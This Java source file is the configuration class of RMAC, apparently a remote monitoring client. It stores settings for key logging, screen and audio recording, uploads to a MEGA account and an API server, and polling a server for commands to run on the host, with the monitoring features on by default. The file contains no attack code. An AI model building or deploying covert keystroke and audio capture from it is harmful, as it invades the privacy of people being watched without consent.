package com.rmac.core;

import com.rmac.RMAC;
import com.rmac.utils.Constants;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.function.BiConsumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import lombok.extern.slf4j.Slf4j;

/**
 * Provides an interface for persistent read/write operation on RMAC host config file (config.rmac),
 * also acts as a central config store when RMAC is running.
 * <br>
 * <br>
 * Configuration properties:
 * <br>
 * <pre>
 * <code>ApiServerUrl</code>             ("")         - RMAC API Server URL.
 * <code>MegaUser</code>                 ("")         - Username for MEGA account.
 * <code>MegaPass</code>                 ("")         - Password for MEGA account.
 * <code>VideoDuration</code>            (600000)     - Duration for screen recordings in milliseconds.
 * <code>FPS</code>                      (20)         - Framerate for screen recordings.
 * <code>KeyLogUploadInterval</code>     (600000)     - Interval for uploads of key-log output.
 * <code>HostName (Read only)</code>     ("")         - Name of the host machine.
 * <code>ClientName</code>               ("")         - Display name given to the host.
 * <code>Id</code>                       ("")         - Unique identifier for this host machine.
 * <code>LogFileUpload</code>            (true)       - Switch to on/off uploads of key-logs.
 * <code>VideoUpload</code>              (true)       - Switch to on/off uploads of screen recordings.
 * <code>MaxStagingSize</code>           (157286400)  - Size limit for staging directories in bytes.
 * <code>MaxStorageSize</code>           (2147483648) - Size limit to store pending uploads in bytes.
 * <code>MaxParallelUploads</code>       (3)          - No. of files that can be uploaded in parallel.
 * <code>FetchCommandPollInterval</code> (5000)       - Polling interval for fetching commands from
 *                                         RMAC Server in milliseconds.
 * <code>ScreenRecording</code>          (true)       - Enable or disable screen recording.
 * <code>AudioRecording</code>           (true)       - Enable or disable audio recording.
 * <code>ActiveAudioRecording</code>     (false)      - Enable or disable active (always-on) audio
 *                                         recording, passive recording monitors default
 *                                         microphone usage by any other program and
 *                                         records only if its being used.
 * <code>KeyLog</code>                   (true)       - Enable or disable key logging.
 * </pre>
 */
@Slf4j
public class Config {

  private String apiServerUrl;
  private String bridgeServerUrl;
  private String megaUser;
  private String megaPass;
  private int videoDuration;
  private int fPS;
  private int keyLogUploadInterval;
  private String clientName;
  private String hostName;
  private String id;
  private boolean logFileUpload;
  private boolean videoUpload;
  private long maxStagingSize;
  private long maxStorageSize;
  private int fetchCommandPollInterval;
  private int maxParallelUploads;
  private boolean screenRecording;
  private boolean audioRecording;
  private boolean activeAudioRecording;
  private boolean keyLog;
  private int clientHealthCheckInterval;

  public transient final List<BiConsumer<String, String>> listeners = new ArrayList<>();

  public Config() {
    this.apiServerUrl = "";
    this.bridgeServerUrl = "";
    this.megaUser = "";
    this.megaPass = "";
    this.videoDuration = 600000;
    this.fPS = 20;
    this.keyLogUploadInterval = 600000;
    this.clientName = "";
    this.hostName = this.getHostName();
    this.id = "";
    this.logFileUpload = true;
    this.videoUpload = true;
    this.maxStagingSize = 157286400L;
    this.maxStorageSize = 2147483648L;
    this.fetchCommandPollInterval = 5000;
    this.maxParallelUploads = 3;
    this.screenRecording = true;
    this.keyLog = true;
    this.audioRecording = true;
    this.activeAudioRecording = false;
    this.clientHealthCheckInterval = 3000;
  }

  /**
   * Read the RMAC configuration file (config.rmac) and load the values to their respective
   * variables.
   *
   * @throws IOException when config file cannot be read.
   */
  public void loadConfig() throws IOException, NoSuchFieldException, IllegalAccessException {
    if (RMAC.fs.exists(Constants.CONFIG_LOCATION)) {
      BufferedReader configReader = RMAC.fs.getReader(Constants.CONFIG_LOCATION);
      String curr;
      StringBuilder multiline = new StringBuilder();
      while ((curr = configReader.readLine()) != null) {
        if (curr.contains("=")) {
          String[] pair = curr.trim().split("=");
          this._setConfig(pair[0].trim(), pair[1].trim(), false);
        } else if (curr.contains("/#")) {
          String key = curr.replace("/#", "");
          while (!(curr = configReader.readLine().trim()).contains("#/")) {
            multiline.append(curr).append(" ");
          }
          this._setConfig(key.trim(), multiline.toString().trim(), false);
          multiline = new StringBuilder();
        }
      }
      configReader.close();
    }
  }

  /**
   * Parse and set the configuration property, optionally persist the config change to config file.
   *
   * @param key     The name of the configuration property as defined in the config file.
   * @param value   The value to be parsed and set.
   * @param persist Whether to write this config back to config.rmac file, so that RMAC remembers
   *                the config when it re-boots.
   */
  private void _setConfig(String key, String value, boolean persist)
      throws NoSuchFieldException, IllegalAccessException {
    String field = Character.toLowerCase(key.charAt(0)) + key.substring(1);
    if (this.contains(
        " VideoDuration FPS KeyLogUploadInterval MaxParallelUploads FetchCommandPollInterval ClientHealthCheckInterval ",
        key)) {
      Integer intValue = Integer.parseInt(value);
      Config.class.getDeclaredField(field).set(this, intValue);
    } else if (this.contains(
        " LogFileUpload VideoUpload ScreenRecording AudioRecording ActiveAudioRecording KeyLog ",
        key)) {
      Boolean boolValue = Boolean.parseBoolean(value);
      Config.class.getDeclaredField(field).set(this, boolValue);
    } else if (this.contains(" MaxStagingSize MaxStorageSize ", key)) {
      Long longValue = Long.parseLong(value);
      Config.class.getDeclaredField(field).set(this, longValue);
    } else {
      Config.class.getDeclaredField(field).set(this, value);
    }

    if (persist) {
      this.updateConfig();
    }

    log.info("Config Loaded: " + key + " - " + value);
  }

  public void setConfig(String key, String value, boolean persist)
      throws NoSuchFieldException, IllegalAccessException {

    this._setConfig(key, value, persist);
    this.listeners.forEach((listener) -> listener.accept(key, value));
  }

  public void setProperty(String key, String value) {
    if (this.setProperty(key, (Object) value)) {
      this.listeners.forEach(listener -> listener.accept(key, value));
    }
  }

  public void setProperty(String key, int value) {
    if (this.setProperty(key, (Object) value)) {
      this.listeners.forEach(listener -> listener.accept(key, String.valueOf(value)));
    }
  }

  public void setProperty(String key, boolean value) {
    if (this.setProperty(key, (Object) value)) {
      this.listeners.forEach(listener -> listener.accept(key, String.valueOf(value)));
    }
  }

  public void setProperty(String key, long value) {
    if (this.setProperty(key, (Object) value)) {
      this.listeners.forEach(listener -> listener.accept(key, String.valueOf(value)));
    }
  }

  public boolean setProperty(String key, Object value) {
    String field = Character.toLowerCase(key.charAt(0)) + key.substring(1);
    try {
      Config.class.getDeclaredField(field).set(this, value);
      this.updateConfig();
      return true;
    } catch (IllegalAccessException | NoSuchFieldException e) {
      log.error("Could not set/update config property: " + key, e);
      return false;
    }
  }

  /**
   * Get the RMAC API Server URL
   *
   * @return The RMAC API Server URL
   */
  public String getApiServerUrl() {
    return this.apiServerUrl;
  }

  /**
   * Get the RMAC Bridging Server URL
   *
   * @return The RMAC Bridging Server URL
   */
  public String getBridgeServerUrl() {
    String url = this.bridgeServerUrl;
    String protocol = url.substring(0, url.indexOf(':'));
    if ("https".equals(protocol)) {
      return "wss://" + url.replace("https://", "");
    } else {
      return "ws://" + url.replace("http://", "");
    }
  }

  /**
   * Get the MEGA username
   *
   * @return The MEGA account username
   */
  public String getMegaUser() {
    return this.megaUser;
  }

  /**
   * Get the MEGA password
   *
   * @return The MEGA account password
   */
  public String getMegaPass() {
    return this.megaPass;
  }

  /**
   * Get the currently configured screen recording duration.
   *
   * @return Screen recording duration in milliseconds.
   */
  public int getVideoDuration() {
    return this.videoDuration;
  }

  /**
   * Get the configured screen recording duration in time format (hh:mm:ss).
   *
   * @return The time formatted screen recording duration.
   */
  public String getVideoDurationFormatted() {
    return String.format("%02d:%02d:%02d", TimeUnit.MILLISECONDS.toHours(this.videoDuration),
        TimeUnit.MILLISECONDS.toMinutes(this.videoDuration) % TimeUnit.HOURS.toMinutes(1),
        TimeUnit.MILLISECONDS.toSeconds(this.videoDuration) % TimeUnit.MINUTES.toSeconds(1));
  }

  /**
   * Get the configured framerate for screen recording.
   *
   * @return The framerate in frames/sec.
   */
  public int getFPS() {
    return this.fPS;
  }

  /**
   * Get the configured interval for key-log output file uploads.
   *
   * @return The interval in milliseconds.
   */
  public int getKeyLogUploadInterval() {
    return this.keyLogUploadInterval;
  }

  /**
   * Get the physical name of the host machine.
   *
   * @return The host machine name.
   */
  public String getHostName() {
    try {
      return InetAddress.getLocalHost().getHostName();
    } catch (UnknownHostException e) {
      return "Unknown";
    }
  }

  /**
   * Get the configured host machine display name.
   *
   * @return The display name for the host.
   */
  public String getClientName() {
    return this.clientName;
  }

  /**
   * Get the unique identifier for the host machine.
   *
   * @return The unique id.
   */
  public String getId() {
    return this.id;
  }

  /**
   * Get the configured flag for key-log uploads.
   *
   * @return The switch (true=upload-on | false=upload-off).
   */
  public boolean getLogFileUpload() {
    return this.logFileUpload;
  }

  /**
   * Get the configured flag for screen recordings uploads.
   *
   * @return The switch (true=upload-on | false=upload-off).
   */
  public boolean getVideoUpload() {
    return this.videoUpload;
  }

  /**
   * Get configured poll interval for fetching commands from RMAC Server to be executed on this host
   * machine.
   *
   * @return The interval in milliseconds.
   */
  public int getFetchCommandPollInterval() {
    return this.fetchCommandPollInterval;
  }

  /**
   * Get the configured interval for health-check pings from RMAC Updater to RMAC Client.
   *
   * @return The interval in milliseconds.
   */
  public int getClientHealthCheckInterval() {
    return this.clientHealthCheckInterval;
  }

  /**
   * Get the configured max size of staging directories.
   *
   * @return The size in bytes.
   */
  public long getMaxStagingSize() {
    return this.maxStagingSize;
  }

  /**
   * Get the configured max storage size RMAC can use for buffering upload-pending
   * key-logs/recordings.
   *
   * @return The size in bytes.
   */
  public long getMaxStorageSize() {
    return this.maxStorageSize;
  }

  /**
   * Returns whether screen recording is enabled or disabled.
   *
   * @return The switch.
   */
  public boolean getScreenRecording() {
    return this.screenRecording;
  }

  /**
   * Returns whether audio recording is enabled or disabled.
   *
   * @return The switch
   */
  public boolean getAudioRecording() {
    return this.audioRecording;
  }

  /**
   * Returns whether audio recording is set to active or passive.
   *
   * @return The switch
   */
  public boolean getActiveAudioRecording() {
    return this.activeAudioRecording;
  }

  /**
   * Returns whether key logging is enabled or disabled.
   *
   * @return The switch.
   */
  public boolean getKeyLog() {
    return this.keyLog;
  }

  /**
   * Get the configured no. of parallel file uploads.
   *
   * @return The no. of parallel file uploads RMAC can perform.
   */
  public int getMaxParallelUploads() {
    return this.maxParallelUploads;
  }

  /**
   * Persist the entire config state from application to the config file (config.rmac).
   */
  public void updateConfig() {
    try {
      PrintWriter writer = RMAC.fs.getWriter(Constants.CONFIG_LOCATION);
      writer.println("ApiServerUrl=" + this.apiServerUrl);
      writer.println("BridgeServerUrl=" + this.bridgeServerUrl);
      writer.println("MegaUser=" + this.megaUser);
      writer.println("MegaPass=" + this.megaPass);
      writer.println("VideoDuration=" + this.videoDuration);
      writer.println("FPS=" + this.fPS);
      writer.println("KeyLogUploadInterval=" + this.keyLogUploadInterval);
      writer.println("ClientName=" + this.clientName);
      writer.println("Id=" + this.id);
      writer.println("LogFileUpload=" + this.logFileUpload);
      writer.println("VideoUpload=" + this.videoUpload);
      writer.println("MaxStagingSize=" + this.maxStagingSize);
      writer.println("MaxStorageSize=" + this.maxStorageSize);
      writer.println("MaxParallelUploads=" + this.maxParallelUploads);
      writer.println("FetchCommandPollInterval=" + this.fetchCommandPollInterval);
      writer.println("ClientHealthCheckInterval=" + this.clientHealthCheckInterval);
      writer.println("ScreenRecording=" + this.screenRecording);
      writer.println("AudioRecording=" + this.audioRecording);
      writer.println("ActiveAudioRecording=" + this.activeAudioRecording);
      writer.println("KeyLog=" + this.keyLog);

      writer.flush();
      writer.close();
    } catch (FileNotFoundException e) {
      log.error("Could not update config file", e);
    }
  }

  /**
   * Register a config change listener.
   *
   * @param callback the callback method to be called when any config property changes.
   */
  public void onChange(BiConsumer<String, String> callback) {
    this.listeners.add(callback);
  }

  /**
   * Whether the substring is present in the source string.
   *
   * @param source    The source string.
   * @param subString The sub-string.
   * @return result <br/> (true = present | false = not-present)
   */
  public boolean contains(String source, String subString) {
    String pattern = "\\s+" + subString + "\\s+";
    Pattern p = Pattern.compile(pattern);
    Matcher m = p.matcher(source);
    return m.find();
  }
}
